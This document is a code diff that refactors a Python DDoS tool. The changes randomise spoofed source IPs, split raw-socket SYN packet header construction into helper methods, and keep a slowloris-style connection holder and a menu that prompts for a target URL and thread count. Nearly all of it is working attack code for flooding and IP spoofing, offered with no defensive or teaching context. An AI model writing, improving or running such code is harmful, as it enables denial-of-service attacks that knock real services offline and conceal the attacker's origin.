@@ -10,14 +10,14 @@ from random import randrange, choice
 import re
 
 class DDoSAttack:
-    def __init__(self, target_url, fake_ip, threads):
+    def __init__(self, target_url, threads):
         self.target_url = target_url
-        self.fake_ip = fake_ip
         self.threads = threads
         self.attack_num = 0
+        self.target_domain = urlparse(target_url).netloc
 
     def start(self):
-        print(f"Starting attack with fake IP {self.fake_ip} on {self.target_url}")
+        print(f"Starting attack on {self.target_url}")
         for _ in range(self.threads):
             thread = threading.Thread(target=self.run)
             thread.start()
@@ -31,7 +31,7 @@ class DDoSAttack:
 
     def ddos_requester(self):
         headers = {
-            'X-Forwarded-For': self.fake_ip,
+            'X-Forwarded-For': self.fake_ip(),
             'User-Agent': choice(self.add_useragent()),
             'Cache-Control': 'no-cache',
             'Accept-Encoding': 'gzip, deflate',
@@ -53,53 +53,23 @@ class DDoSAttack:
         ]
 
     def syn_flood(self):
-        tgt = urlparse(self.target_url).netloc
-        if not self.is_valid_ip(self.fake_ip):
-            print(f"Invalid fake IP: {self.fake_ip}")
-            return
-
         try:
-            ihl = 5
-            version = 4
-            tos = 0
-            tot = 40
-            id = 54321
-            frag_off = 0
-            ttl = 64
-            protocol = IPPROTO_TCP
-            check = 10
-            s_addr = inet_aton(self.fake_ip)
-            d_addr = inet_aton(tgt)
-            ihl_version = (version << 4) + ihl
-            ip_header = pack('!BBHHHBBH4s4s', ihl_version, tos, tot, id, frag_off, ttl, protocol, check, s_addr, d_addr)
-
-            source = 54321
-            dest = 80
-            seq = 0
-            ack_seq = 0
-            doff = 5
-            tcp_flags = 1
-            window = htons(5840)
-            check = 0
-            urg_prt = 0
-
-            offset_res = (doff << 4)
-            tcp_header = pack('!HHLLBBHHH', source, dest, seq, ack_seq, offset_res, tcp_flags, window, check, urg_prt)
+            ip_header = self.create_ip_header()
+            tcp_header = self.create_tcp_header()
             packet = ip_header + tcp_header
 
             sock = socket(AF_INET, SOCK_RAW, IPPROTO_TCP)
             sock.setsockopt(IPPROTO_IP, IP_HDRINCL, 1)
-            sock.sendto(packet, (tgt, 0))
+            sock.sendto(packet, (self.target_domain, 0))
         except KeyboardInterrupt:
             print("SYN Flood stopped.")
         except Exception as e:
             print(f"Error in SYN Flood: {e}")
 
     def pyslow(self):
-        tgt = urlparse(self.target_url).netloc
         try:
             sock = socket(AF_INET, SOCK_STREAM)
-            sock.connect((tgt, 80))
+            sock.connect((self.target_domain, 80))
             sock.send(b'GET / HTTP/1.1\r\n')
             time.sleep(5)
         except KeyboardInterrupt:
@@ -107,11 +77,37 @@ class DDoSAttack:
         except Exception as e:
             print(f"Error in Pyslow: {e}")
 
-    def is_valid_ip(self, ip):
-        pattern = re.compile(r'^(\d{1,3}\.){3}\d{1,3}$')
-        if pattern.match(ip):
-            return all(0 <= int(part) <= 255 for part in ip.split('.'))
-        return False
+    def fake_ip(self):
+        return '.'.join(str(randrange(256)) for _ in range(4))
+
+    def create_ip_header(self):
+        ihl = 5
+        version = 4
+        tos = 0
+        tot = 40
+        id = 54321
+        frag_off = 0
+        ttl = 64
+        protocol = IPPROTO_TCP
+        check = 10
+        s_addr = inet_aton(self.fake_ip())
+        d_addr = inet_aton(self.target_domain)
+        ihl_version = (version << 4) + ihl
+        return pack('!BBHHHBBH4s4s', ihl_version, tos, tot, id, frag_off, ttl, protocol, check, s_addr, d_addr)
+
+    def create_tcp_header(self):
+        source = 54321
+        dest = 80
+        seq = 0
+        ack_seq = 0
+        doff = 5
+        tcp_flags = 1
+        window = htons(5840)
+        check = 0
+        urg_prt = 0
+
+        offset_res = (doff << 4)
+        return pack('!HHLLBBHHH', source, dest, seq, ack_seq, offset_res, tcp_flags, window, check, urg_prt)
 
 def menu():
     print(Style.BRIGHT + Fore.YELLOW + "[INFORMATION!]" + Fore.WHITE + " Press CTRL + C and ENTER to exit!!")
@@ -141,9 +137,8 @@ def menu():
         
         threads = int(input("Enter number of threads: "))
         target_url = input(Fore.RED + Style.BRIGHT + "Enter target URL: ")
-        fake_ip = input("Enter fake IP: ") or fake_ip()
 
-        attack = DDoSAttack(target_url, fake_ip, threads)
+        attack = DDoSAttack(target_url, threads)
         attack.start()
         
     except ValueError:
